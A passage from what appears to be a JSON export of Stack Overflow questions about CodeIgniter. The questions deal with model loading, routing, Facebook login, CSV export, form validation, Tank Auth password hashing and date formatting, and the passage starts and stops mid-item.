\n\n}\n}\n?&gt;\n</code></pre>\n\n<p>group_model.php model:</p>\n\n<p>\n\n<pre><code>class Group_model extends CI_Model{\n\nfunction __construct(){\n    parent::__construct();          \n}\n\n/**\n * Get all groups in db\n **/    \nfunction get_groups($user_id){\n    $this-&gt;db-&gt;select('g.group_name');\n    $this-&gt;db-&gt;from('groups AS g');\n    $this-&gt;db-&gt;join('members AS m', 'g.group_id = m.group_id');\n    $this-&gt;db-&gt;where('m.user_id', $user_id);\n    return $this-&gt;db-&gt;get()-&gt;result_array();\n}\n}\n</code></pre>\n\n<p>My connection_view.php view contains a div and some php codes to display the $data['tabs'] passed as array in load_connections function.</p>\n\n<p>The problem is, I'm getting an error that says:</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: Connections::$group_model\n\nFilename: controllers/connections.php\n\nLine Number: 14\n</code></pre>\n\n<p>and</p>\n\n<pre><code>Fatal error: Call to a member function get_groups() on a non-object in    C:\\xampp\\htdocs\\hmvc\\application\\modules\\connections\\controllers\\connections.php on line 14\n</code></pre>\n\n<p>I have clearly followed all the instructions provided on MX wiki at <a href=\"https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home\" rel=\"nofollow\">https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home</a>\nand set up everything as needed.\nMy database.php under /application/config is already configured.\nroutes.php is also configured pointing the default controller to main.php</p>\n\n<p>I wonder what I have missed or have done wrong that I can't get it to work.</p>\n\n<p>Codeigniter version: 2.1.3\nMX version: 5.4</p>\n\n<p>Thanks in advance for all the help.</p>\n"},{"tags":["php","codeigniter","csv","import","etl"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":94,"score":-1,"question_id":12841992,"title":"What is the best way to do csv file import and mapping with codeigniter","body":"<p>I am trying to create a import tool that would read the csv file and allow me to map it to a the table columns and import it. I am trying to do this using code igniter.</p>\n\n<p>Has anyone does this and have a library or is there a tool available in php and/or codeigniter. I wanted to check before I try to reinvent the wheel.</p>\n"},{"tags":["php","codeigniter","google-maps"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":11515029,"title":"How to enable Info Windows Open on Default With CI google map library","body":"<p>I am using <b><a href=\"http://biostall.com/codeigniter-google-maps-v3-api-library\" rel=\"nofollow\">biostall's codeigniter google map library</a></b> for my google map display. I followed the instruction to display info windows and had the map displayed properly on the page. And currently the info window only opens when clicked on the pointer. Progress so far is like the purple icon displayed in demo.  Click for <b><a href=\"http://biostall.com/demos/google-maps-v3-api-codeigniter-library/multiplemarkers\" rel=\"nofollow\">Quick demo</a></b>.</p>\n\n<p>I wasn't able to make the info window open on default. Please advise.</p>\n\n<p>Configuration code as per below:</p>\n\n<pre><code>// map\n$this-&gt;load-&gt;library('googlemaps');\n// Initialize our map. Here you can also pass in additional parameters for customising the map (see below) \n$config['center'] = '37.4419, -122.1419';\n$config['zoom'] = '14';\n$config['map_width'] = '500px';\n$this-&gt;googlemaps-&gt;initialize($config);\n\n// set markers\n$marker = array();\n$marker['position'] = '37.4419, -122.1419';\n$marker['infowindow_content'] = '&lt;b&gt;We are here!!&lt;/b&gt;;\n$marker['animation'] = 'DROP';\n$this-&gt;googlemaps-&gt;add_marker($marker);\n\n// Create the map. This will return the Javascript to be included in our pages &lt;head&gt;&lt;/head&gt; section and the HTML code to be placed where we want the map to appear. \n$data['map'] = $this-&gt;googlemaps-&gt;create_map();\n</code></pre>\n"},{"tags":["php","facebook","codeigniter","sdk"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":105,"score":0,"question_id":12839745,"title":"Codeigniter Facebook Login Redirect Url to 404 page not found error","body":"<p>I have implemented facebook login with php-sdk 3.0 for my codeigniter site(1.7.2).After loggedin with facebook,I get 404 page not found error with the below link:</p>\n\n<pre><code>&lt;http://mydomain.com/index.php?%2Ffacebook&amp;state=8856b22556bb4b5930be7ecb711b60db&amp;code=AQDN3dY5u-CNrxqmRPWW5xApjM_N0lSrXs-7tmEL1SUpwxgUNX0K_8xU_qSS99hrzLro-R7k3RKk-FZ7qbHmuS6nTHy7sySORzp5n4Q5Xl9GR8HASg_whNev6TpuxdpZHHWm4jTrHwFGKhUR34bMNscMlD3eVOs5eE54gktQspK2cm37bU3pE9ePel444rGuMPeS_z3xYgpc8sqypzOjcq1F#_=_&gt;\n</code></pre>\n\n<p>Login url that i used is:</p>\n\n<pre><code>$loginurl = $this-&gt;facebook-&gt;getLoginUrl($params = array('redirect_uri' =&gt; 'http://mydomain.com/index.php?/facebook','scope'=&gt;'email'));\n</code></pre>\n"},{"tags":["php","codeigniter","facebook-login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":157,"score":1,"question_id":12417633,"title":"Codeigniter login with facebook return userId 0 , After login success and redirect back to my side","body":"<p>I have developed login facebook app(Facebook SDK) with codeigniter, Firstly, I do in my local.</p>\n\n<p>It's working well, when do login successful, facebook redirect back by redirect_uri to my side controller,and get userId to query information of user logged.</p>\n\n<p>But, when I upload this code to Server side, redirect_uri is worked, but I get return 0 of userId, so , if userId 0, I can't query data of users logged.</p>\n\n<p>My question is, why userId return 0 , after login succeed?</p>\n\n<p>Code Controller:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n    class Setting extends CI_Controller {\n\n       public function __construct()\n       {   \n\n          $CI = &amp; get_instance();\n          $CI-&gt;config-&gt;load(\"facebook\",TRUE);\n          $config = $CI-&gt;config-&gt;item('facebook');\n          $this-&gt;load-&gt;library('facebook', $config);\n\n       }\n       public function index() \n       {\n             if($this-&gt;form_validation-&gt;run() == FALSE){\n\n                 $this-&gt;acc_login();\n             }else {\n                 redirect('check_session', 'refresh');  \n             }\n       }\n\n       public function acc_login()\n       {\n             $user = $this-&gt;facebook-&gt;getUser();\n\n             if($user) {\n\n             try {              \n                  $user_info = $this-&gt;facebook-&gt;api('/me');\n                  redirect(base_url());             \n             } catch(FacebookApiException $e) {\n                  echo '&lt;pre&gt;'.htmlspecialchars(print_r($e, true)).'&lt;/pre&gt;';\n                  $user = null;\n             }\n             } else {\n                    $param = array('scope' =&gt; 'email,read_stream','redirect_uri' =&gt; $my_url);\n                    $data['getURLLogin'] = \"&lt;a href=\\\"\".$this-&gt;facebook-&gt;getLoginUrl($param).\"\\\"&gt;&lt;img src=\\\"\".base_url().\"public/frontend/images/login-fb.png\\\" width=\\\"155\\\" height=\\\"25\\\" /&gt;&lt;/a&gt;\";\n\n             }\n       }\n\n    }\n\n?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12838108,"title":"Setting Database in codeigniter based on the URL (dynamically)","body":"<p>I am using codeigniter to develop my web based application. This will be used by various different clients and each will have there own database but same codebase.</p>\n\n<p>I want to be able to set the name of database in database.php based on the clients who access it i.e based on the url. So if clientA.com access its then it should set the database name to clintA and if clientB.com access it then it should set it to clientB.com. </p>\n\n<p>Any idea as how should I approch this.</p>\n"},{"tags":["php","mysql","codeigniter","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12837819,"title":"adding mysql columns for ouput in csv php?","body":"<p>im trying to add table data from mysql to csv and output them to browser using php.</p>\n\n<p>PHP:</p>\n\n<pre><code>$rows = $t-&gt;db-&gt;query(\"SELECT * from Animals\");\n$output = fopen('php://output', 'w');\nfputcsv($output, array('Column 1', 'Column 2', 'Column 3'));\nwhile ($row = $rows-&gt;result_array()) fputcsv($output, $row);\n</code></pre>\n\n<p>but im getting error:</p>\n\n<blockquote>\n  <p>Message: Array to string conversion</p>\n</blockquote>\n\n<p>on the line where the while loop is, i don't seem to see where the problem is.</p>\n\n<p>thanks</p>\n"},{"tags":["jquery","codeigniter","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12833231,"title":"codeigniter jquery not working","body":"<p>I have included files in codeigniter webpage like this:  </p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href='&lt;?= base_url() ?&gt;css/unofficialchannels/style.css' /&gt;\n&lt;script type=\"text/javascript\" src='&lt;?= base_url() ?&gt;js/jquery-1.8.2.min.js'&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src='&lt;?= base_url() ?&gt;js/jquery.tweetable.js'&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src='&lt;?= base_url() ?&gt;js/javascript.js'&gt;&lt;/script&gt;\n</code></pre>\n\n<p>I have a function in javascript.js file like this:  </p>\n\n<pre><code>$(function () {\n  alert('It works!');\n}); \n</code></pre>\n\n<p>I also tried a function like this:  </p>\n\n<pre><code>$(document).ready(function(){\n    alert('It works!');\n});\n</code></pre>\n\n<p>But it doesn't work, i don't get alert. Anybody has any ideas?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":12836951,"title":"Codeigniter - custom routes","body":"<p>Lets say I have a controller 'standard' with an action 'main'.</p>\n\n<p>If I go to www.myapp.com/standard/main it will invoke the main action in the standard controller.</p>\n\n<p>Now if I want to change the URL I go into the routes.php and set sth like the following:</p>\n\n<p>$route['welcome'] = \"standard/main\";</p>\n\n<p>Now I can visit www.myapp.com/welcome and it will invoke the same action.</p>\n\n<p>However it is still possible to visit www.myapp.com/standard/main. I now have two routes which lead to the same controller action.</p>\n\n<p>Is this the usual way or should I somehow disable the now unwanted www.myapp.com/standard/main route? If so, how would I do that?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12836391,"title":"How to give comman error message instead of multiple errors in codeigniter","body":"<p>I m new to codeigniter developement. I created simple login form as follows:</p>\n\n<p>In my login_view page</p>\n\n<pre><code>  &lt;?php echo validation_errors(); ?&gt;\n  //my form html code comes here\n</code></pre>\n\n<p>In my controller page</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('username', 'Username', 'required');\n$this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required');\n\nif ($this-&gt;form_validation-&gt;run() == FALSE)\n{\n  $this-&gt;load-&gt;view('login_view',$data);\n}\nelse\n{\n //form validated do some work here\n}\n</code></pre>\n\n<p>Now problem is that when I submit form with empty username and password field this shows me errors as </p>\n\n<pre><code>The Username field is required.\nThe Password field is required.\n</code></pre>\n\n<p>This is right but I want to show only single message as </p>\n\n<pre><code>Please enter username and password......\n</code></pre>\n\n<p>instead of two or N number of messages per field. I already tried form_error('fieldname') function but no use. How do I get above mentioned output.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["json","flash","codeigniter","actionscript","urlloader"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":441,"score":1,"question_id":8692667,"title":"Getting Error #2032: Stream Error. in Flash while sending url request to server","body":"<p>I am sending http request to server via URLLoader in Flash. My Code is:</p>\n\n<pre><code>var urlLoader:URLLoader=new URLLoader();\nvar urlRequest:URLRequest=new URLRequest();\nvar urlparam:URLVariables= new URLVariables();\nurlparam.req=JSON.encode(workout);\nurlRequest.method=\"POST\";\nurlRequest.data=urlparam;\nurlRequest.url=\"http://mydomain.com/saveworkout.php\";\nurlLoader.addEventListener(Event.COMPLETE,loadCompleted);\nurlLoader.addEventListener(IOErrorEvent.IO_ERROR,loadError);\nurlLoader.addEventListener(SecurityErrorEvent.SECURITY_ERROR,securityError);\nurlLoader.load(urlRequest);\n\n}\n\nprivate function loadError(event:IOErrorEvent):void{\n    trace(\"Stream Error=\"+event.text);\n\n\n    }\n    private function securityError(event:SecurityErrorEvent):void{\n        trace(\"Security Error=\"+event.text);\n\n        }\nprivate function loadCompleted(event:Event):void{\n    var urlLoader:URLLoader=event.target as URLLoader;\n    trace(urlLoader.data);\n\n\n    }\n</code></pre>\n\n<p>This code works fine when I test it locally and send request to localhost, but giving me Error #2032: Stream Error. At remote server codeigniter framework is being used. I also the crossdomain.xml in the httpdocs directory, and also cross check the request url. Request url opens fine directly in the web browsers. Any idea?</p>\n\n<p>Thanks &amp; Regards,</p>\n"},{"tags":["php","codeigniter","expressionengine","safecracker"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12797324,"title":"Expression Engine SafeCracker Formatting a Date Field format=”%d/%m/%Y” = 01/01/1970","body":"<p>Hi I am trying to format my date field which is called {member_birthday} with the format attribute. But whenever I apply the attribute to the tag it shows the date in the correct format but the with an incorrect date.</p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>&lt;input type=\"text\" name=\"display_birthday\" id=\"display_birthday\" value=\"{member_birthday}\" maxlength=\"23\" size=\"25\"/&gt; \n</code></pre>\n\n<p>Displays the correct date i.e 1982-11-08 12:00 AM</p>\n\n<pre><code>&lt;input type=\"text\" name=\"display_birthday\" id=\"display_birthday\" value=\"{member_birthday format=\"%d/%m/%Y\"}\" maxlength=\"23\" size=\"25\"/&gt;\n</code></pre>\n\n<p>Displays an incorrect date i.e 01/01/1970</p>\n"},{"tags":["codeigniter","routes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":958,"score":0,"question_id":7262984,"title":"CodeIgniter route not working","body":"<p>I have the following routes in my routes file:</p>\n\n<pre><code>$route['default_controller'] = \"main\";\n$route['404_override'] = '';\n$route['testroute'] = \"main\";\n</code></pre>\n\n<p>As you can see all I want is when someone goes to mydomain.com/testroute it should just route back to the default controller. However when I go to that I get a 404 error. Am I doing something wrong in the way I'm writing this route?</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12833390,"title":"load_administrator_email() codeigninter.","body":"<p>I was trying to find out the error but I coudnt. I use codeigniter.\nHere is the code</p>\n\n<pre><code>function send_emailalertstoAdmin($emailmessage,$ad_title)\n{\n     $this-&gt;load-&gt;model('user_model');\n     $query_result =  $this-&gt;user_model-&gt;load_administrator_email();\n\n    //$this-&gt;load-&gt;database();\n\n    //$query = $this-&gt;db-&gt;query('SELECT users.email FROM users WHERE users.id =1');\n\n    foreach ($query_result as $row)\n    {           \n        $email= $row-&gt;email;\n\n        $successmasg = '';\n        $from = \"info@xxxt.com\";                    \n        $subject = \"xxx \". $ad_title . \" is Stolen\"; \n        $message = $emailmessage;\n        $headers  = 'MIME-Version: 1.0' . \"\\r\\n\";\n        $headers .= 'Content-type: text/html; charset=iso-8859-1' . \"\\r\\n\";\n        $headers .= 'From: xxxxx.com &lt;info@xxxxt.com&gt;' . \"\\r\\n\"; \n\n        $successmasg = mail($email, $subject, $message, $headers);\n    }\n}\n</code></pre>\n\n<p>I got the following error.\nFatal error: Call to undefined method User_model::load_administrator_email() </p>\n\n<p>Here is the load_administrator_email()  function</p>\n\n<pre><code>function load_administrator_email()\n{\n    $sql = \"SELECT users.email FROM users WHERE users.id =1\";\n    $queryData = $this-&gt; db-&gt;query($sql);   \n    return $queryData -&gt; result();\n}   \n</code></pre>\n\n<p>I was trying to find the error but I coudnt.\nwhat I tried,\n1. sql query is correct and it gives correct result.\n2. when I hardcode email and comment calling load_administrator_email()  in first function ,email goes correctly.</p>\n\n<p>please help me to correct this.</p>\n\n<p>thx in advance</p>\n"},{"tags":["php","codeigniter","md5","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12834083,"title":"Tank auth in different system（Mac and Linux） create different password Hash code","body":"<p>I used mac as web sever, and took codeigniter as framework. For authetication, I applied tank auth. One issue occurs:</p>\n\n<p>Before: I used mac as web sever, logging in is good.</p>\n\n<p>Now: I used linux as web server. I imported the same database, and the website run well. However, i can't log in.</p>\n\n<p>So I tested registering using the same password in mac and linux, found that it create different password Hash code .</p>\n\n<p>Linux:</p>\n\n<pre><code>$P$Bh3B8uGDw0yGO1e/ytCUw2jXcswkso1\n</code></pre>\n\n<p>Mac:</p>\n\n<pre><code>$2a$08$jBCiR79fHN6xzOw5sB09beFifwU08nQdO0Au8P3hxSvIUnoepKfwW\n</code></pre>\n\n<p>My question is : is this issue about system? or php version?</p>\n\n<p>Or it's about md5() function of php?</p>\n\n<p>I present some code of password hash in tank auth:</p>\n\n<pre><code>function PasswordHash($iteration_count_log2, $portable_hashes)\n{\n    $this-&gt;itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';\n\n    if ($iteration_count_log2 &lt; 4 || $iteration_count_log2 &gt; 31)\n        $iteration_count_log2 = 8;\n    $this-&gt;iteration_count_log2 = $iteration_count_log2;\n\n    $this-&gt;portable_hashes = $portable_hashes;\n\n    $this-&gt;random_state = microtime();\n    if (function_exists('getmypid'))\n        $this-&gt;random_state .= getmypid();\n}\n\nfunction get_random_bytes($count)\n{\n    $output = '';\n    if (is_readable('/dev/urandom') &amp;&amp;\n        ($fh = @fopen('/dev/urandom', 'rb'))) {\n        $output = fread($fh, $count);\n        fclose($fh);\n    }\n\n    if (strlen($output) &lt; $count) {\n        $output = '';\n        for ($i = 0; $i &lt; $count; $i += 16) {\n            $this-&gt;random_state =\n                md5(microtime() . $this-&gt;random_state);\n            $output .=\n                pack('H*', md5($this-&gt;random_state));\n        }\n        $output = substr($output, 0, $count);\n    }\n\n    return $output;\n}\n\nfunction encode64($input, $count)\n{\n    $output = '';\n    $i = 0;\n    do {\n        $value = ord($input[$i++]);\n        $output .= $this-&gt;itoa64[$value &amp; 0x3f];\n        if ($i &lt; $count)\n            $value |= ord($input[$i]) &lt;&lt; 8;\n        $output .= $this-&gt;itoa64[($value &gt;&gt; 6) &amp; 0x3f];\n        if ($i++ &gt;= $count)\n            break;\n        if ($i &lt; $count)\n            $value |= ord($input[$i]) &lt;&lt; 16;\n        $output .= $this-&gt;itoa64[($value &gt;&gt; 12) &amp; 0x3f];\n        if ($i++ &gt;= $count)\n            break;\n        $output .= $this-&gt;itoa64[($value &gt;&gt; 18) &amp; 0x3f];\n    } while ($i &lt; $count);\n\n    return $output;\n}\n    function HashPassword($password)\n{\n    $random = '';\n\n    if (CRYPT_BLOWFISH == 1 &amp;&amp; !$this-&gt;portable_hashes) {\n        $random = $this-&gt;get_random_bytes(16);\n        $hash =\n            crypt($password, $this-&gt;gensalt_blowfish($random));\n        if (strlen($hash) == 60)\n            return $hash;\n    }\n\n    if (CRYPT_EXT_DES == 1 &amp;&amp; !$this-&gt;portable_hashes) {\n        if (strlen($random) &lt; 3)\n            $random = $this-&gt;get_random_bytes(3);\n        $hash =\n            crypt($password, $this-&gt;gensalt_extended($random));\n        if (strlen($hash) == 20)\n            return $hash;\n    }\n\n    if (strlen($random) &lt; 6)\n        $random = $this-&gt;get_random_bytes(6);\n    $hash =\n        $this-&gt;crypt_private($password,\n        $this-&gt;gensalt_private($random));\n    if (strlen($hash) == 34)\n        return $hash;\n\n    # Returning '*' on error is safe here, but would _not_ be safe\n    # in a crypt(3)-like function used _both_ for generating new\n    # hashes and for validating passwords against existing hashes.\n    return '*';\n}\n</code></pre>\n\n<p>Any idea? I searched this issue in google but got little information, Could you kindly help me? thank you..</p>\n\n<p>Oh, maybe it's about CRYPT_BLOWFISH. Linux don't have CRYPT_BLOWFISH.</p>\n"},{"tags":["image","codeigniter","controller","mime"],"answer_count":6,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":2757,"score":0,"question_id":1911094,"title":"Is there a way to have a Codeigniter controller return an image?","body":"<p>I was wondering if there was a way for a controller to, instead of returning a string, or a view, return an image (be it JPG, PNG etc).  For example, instead of ending with a $this->load->view('folder/special_view.php), I'd like to do something like $this->load->image('images/gorilla.png'), and have it so if my user were to go to that controller they would see an image as if they'd gone to a normal .png or jpeg.  Can I set the headers so it expects a different MIME?  Example code of this would be fantastic.</p>\n\n<p>It would take forever for me to explain why I need this, but it involves bringing a premade CMS into codeigniter, and having it need certian things to be true.  Thank you so much!</p>\n"},{"tags":["php","mysql","codeigniter","orm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12833993,"title":"Codeigniter MySQL a Join Query with a column name collision in the results","body":"<p>I have a very common, run of the mill JOIN query where I have found my self in a bit of a pickle. </p>\n\n<p>My CI DB Query looks like:</p>\n\n<pre><code>    $this-&gt;db-&gt;select()\n    -&gt;from('user_event')\n    -&gt;join('game_bridge', 'user_event.gmeID = game_bridge.gmeID')\n    -&gt;where('user_event.memID', $memID);\n</code></pre>\n\n<p>Now what I failed to realize up until about a minute ago, is that both tables have a \"location\" column, however both columns contain unique sets of data to the query results I am looking for overall. With that is there a way to give one location column or the other an alias so I can access the results object for that under a different property name?</p>\n\n<p>If so, how can I do that with CI's DB class/helper?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":12832924,"title":"displaying the dates in a particular format php","body":"<p>I have a date array sorted in asc order. I want to display the date as </p>\n\n<pre><code>Oct 10,12,24 2012\nDec 12,20,24 2012\nJan 02,10,25 2013\n</code></pre>\n\n<p>I have got the dates as the month ie.Oct,Dec,Jan.. and the dates and year, but i want it to be displayed in the above mentioned format. I have tried the below code, but it is not giving the desired result. Can someone pls help me with this?\n$CruiseDetailsSailing is the array containing the date in an ascending order.</p>\n\n<pre><code>  if (count($CruiseDetailsSailing) &gt; 0) {\n                            $date = array();\n                            $month = array();\n                            $Year = array();\n                            for ($n = 0; $n &lt; count($CruiseDetailsSailing); $n++) {\n                                if ($CruiseDetailsSailing[$n] != \"\") {\n                                    $date[] = date('Y-m-d', strtotime($CruiseDetailsSailing[$n]));\n                                }\n                            }\n                        }\n                        sort($date);\n                        if (count($date) &gt; 0) {\n                            $temp = \"\";\n                            $yeartemp = \"\";\n                            for ($p = 0; $p &lt; count($date); $p++) {\n                                $month = date(\"M\", strtotime($date[$p]));\n                                $day = date(\"d\", strtotime($date[$p]));\n                                $year = date(\"Y\", strtotime($date[$p]));\n                                if ($month != $temp) {\n                                    $temp = $month;\n                                    ?&gt;\n                                    &lt;li&gt; &lt;?php\n                        echo $temp . \" \" . $day . \", \";\n                    } else {\n                        echo $day . \", \";\n                    }\n                    if (($p != 0) &amp;&amp; ((date(\"M\", strtotime($date[$p]))) == (date(\"M\", strtotime($date[$p - 1])))) &amp;&amp; ((date(\"Y\", strtotime($date[$p]))) == (date(\"Y\", strtotime($date[$p - 1]))))) {\n                        echo $year;\n                    }\n                    if (($p != 0) &amp;&amp; ((date(\"M\", strtotime($date[$p]))) != (date(\"M\", strtotime($date[$p - 1])))) &amp;&amp; ((date(\"Y\", strtotime($date[$p]))) != (date(\"Y\", strtotime($date[$p - 1]))))) {\n                        echo $year;\n                    }\n                }\n</code></pre>\n\n<p>Oct is the month and 10,12,24 are the months and 2012 is the year. I got the the dates as Oct 10 2012,Oct 12 2012,Oct 24 2012. I just want to display the results as Oct only once and then the dates and the year just once.\nThanks,</p>\n"},{"tags":["php","javascript","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12833110,"title":"get the input box 'name' using javascript","body":"<p>I am making form in PHP and submitting using javascript. I want to get the name of input box, As normal coding gives the value of the input box, but i need to get name of input box. Without onclick functionality on it. Can it possible that retrieving the name of input box in other javascript function on click a button.\nfor example </p>\n\n<pre><code>&lt;input type=\"radio\" name=\"text_name\" value=\"4\" id=\"d\"&gt;\n</code></pre>\n\n<p>Now onclick a other button I am calling <code>test()</code>, In <code>test()</code> how can I get the name of the input box. </p>\n"},{"tags":["php","codeigniter","openx"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":143,"score":0,"question_id":11305756,"title":"codeigniter view are not loading in constructor with parameter","body":"<p>I am trying to load a view from constructor with parameter $data. Earlier it was working fine and now suddenly it stopped working. Below is the code:</p>\n\n<h2>permissionerror View</h2>\n\n<pre><code>    &lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n              &lt;tr&gt;\n                &lt;td width=\"6\" align=\"left\" valign=\"top\" background=\"&lt;?php echo base_url();?&gt;images/bg/topbg.gif\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/top-left.gif\" width=\"5\" height=\"34\" /&gt;&lt;/td&gt;\n                &lt;td height=\"34\" align=\"left\" valign=\"middle\" background=\"&lt;?php echo base_url();?&gt;images/bg/topbg.gif\" class=\"heading\"&gt;Access Forbidden&lt;/td&gt;\n                &lt;td width=\"6\" align=\"right\" valign=\"top\" background=\"&lt;?php echo base_url();?&gt;images/bg/topbg.gif\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/top-right.gif\" width=\"5\" height=\"34\" /&gt;&lt;/td&gt;\n              &lt;/tr&gt;\n              &lt;tr&gt;\n                &lt;td align=\"left\" valign=\"top\" background=\"&lt;?php echo base_url();?&gt;images/bg/main-content-bg-left.gif\"&gt;&amp;nbsp;&lt;/td&gt;\n                &lt;td height=\"165\" valign=\"top\"  bgcolor=\"#FFFFFF\" class=\"leftredheading\"&gt;&lt;div style=\"margin:30px auto;padding-left:15px\"&gt;&lt;? if(isset($sn_error)) echo $sn_error;?&gt;&lt;/div&gt;&lt;/td&gt;\n                &lt;td align=\"right\" valign=\"top\" background=\"&lt;?php echo base_url();?&gt;images/bg/main-content-bg-right.gif\"&gt;&amp;nbsp;&lt;/td&gt;\n              &lt;/tr&gt;\n              &lt;tr&gt;\n                &lt;td align=\"left\" valign=\"bottom\" background=\"&lt;?php echo base_url();?&gt;images/bg/bottom-bg.gif\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/bottom-left-corner.gif\" width=\"5\" height=\"5\" /&gt;&lt;/td&gt;\n                &lt;td valign=\"top\" background=\"&lt;?php echo base_url();?&gt;images/bg/bottom-bg.gif\"&gt;&lt;/td&gt;\n                &lt;td align=\"right\" valign=\"bottom\" background=\"&lt;?php echo base_url();?&gt;images/bg/bottom-bg.gif\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/bottom-right-corner.gif\" width=\"5\" height=\"5\" /&gt;&lt;/td&gt;\n              &lt;/tr&gt;\n            &lt;/table&gt;\n\nTemplate code:\n\n&lt;?php $this-&gt;load-&gt;view('includes/login/header'); ?&gt;\n&lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#e7e7de\"&gt;\n  &lt;tr&gt;\n    &lt;td width=\"18\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"18\" height=\"1\" /&gt;&lt;/td&gt;\n    &lt;td width=\"191\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"191\" height=\"1\" /&gt;&lt;/td&gt;\n    &lt;td width=\"18\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"18\" height=\"1\" /&gt;&lt;/td&gt;\n    &lt;td width=\"100%\"&gt;&amp;nbsp;&lt;/td&gt;\n    &lt;td width=\"161\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"18\" height=\"1\" /&gt;&lt;/td&gt;\n    &lt;td width=\"191\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"191\" height=\"1\" /&gt;&lt;/td&gt;\n    &lt;td width=\"18\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/zero.gif\" width=\"18\" height=\"1\" /&gt;&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;&amp;nbsp;&lt;/td&gt;\n    &lt;td align=\"left\" valign=\"top\"&gt;&lt;table width=\"191\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt;\n      &lt;tr&gt;\n        &lt;td background=\"&lt;?php echo base_url();?&gt;images/bg/left-menu-white-bg.gif\"&gt; &lt;?php $this-&gt;load-&gt;view('includes/login/top_right'); ?&gt; &lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td height=\"50\" background=\"&lt;?php echo base_url();?&gt;images/bg/left-menu-white-bg.gif\"&gt;&amp;nbsp;&lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td background=\"&lt;?php echo base_url();?&gt;images/bg/left-menu-white-bg.gif\"&gt;&lt;table width=\"166\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n          &lt;tr&gt;\n            &lt;td align=\"left\" valign=\"top\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/needhelp-top.gif\" width=\"166\" height=\"7\" /&gt;&lt;/td&gt;\n          &lt;/tr&gt;\n          &lt;tr&gt;\n            &lt;td align=\"center\" valign=\"top\" bgcolor=\"#F8F7EC\"&gt; &lt;?php $this-&gt;load-&gt;view('includes/login/bottom_right'); ?&gt;\n                &lt;br /&gt;&lt;/td&gt;\n          &lt;/tr&gt;\n          &lt;tr&gt;\n            &lt;td align=\"left\" valign=\"top\" bgcolor=\"#F8F7EC\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/needhelp-bottom.gif\" width=\"166\" height=\"7\" /&gt;&lt;/td&gt;\n          &lt;/tr&gt;\n        &lt;/table&gt;\n          &lt;br 